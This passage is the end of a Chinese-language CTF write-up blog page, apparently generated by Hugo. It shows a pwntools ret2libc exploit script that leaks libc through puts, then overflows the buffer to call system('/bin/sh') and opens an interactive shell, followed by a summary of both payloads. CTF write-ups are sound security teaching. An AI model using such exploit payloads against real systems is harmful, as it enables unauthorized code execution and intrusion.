+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_ret_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">Payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><blockquote>
+<p>64位用puts泄露libc
+第一次payload泄露libc
+payload =b&rsquo;A&rsquo;*(0x20 +8) +p64(rdi_addr) +p64(elf.got[&lsquo;puts&rsquo;]) +p64(elf.plt[&ldquo;puts&rdquo;]) +p64(main_addr)</p>
+<p>第二次payload得shell
+payload=b&rsquo;A&rsquo;*(0x20 +8) +p64(ret_addr) +p64(rdi_addr) +p64(bin_sh) +p64(sys_addr)</p>
+</blockquote>
+<p>libc版本选择1，得到flag</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://smera1d0.github.io/tags/ctf/">CTF</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://smera1d0.github.io/posts/hashctf2024-%E9%A2%98%E8%A7%A3/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>HASHCTF2024 题解</span>
+  </a>
+  <a class="next" href="https://smera1d0.github.io/posts/hctf-2023-wp/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>HCTF 2023 wp</span>
+  </a>
+</nav>
+
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="Smera1d0/Smera1d0.github.io"
+        data-repo-id="R_kgDOIXSe_Q"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOIXSe_c4CmMtR"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>© <a href="https://github.com/adityatelange/hugo-PaperMod/graphs/contributors">PaperMod Contributors</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
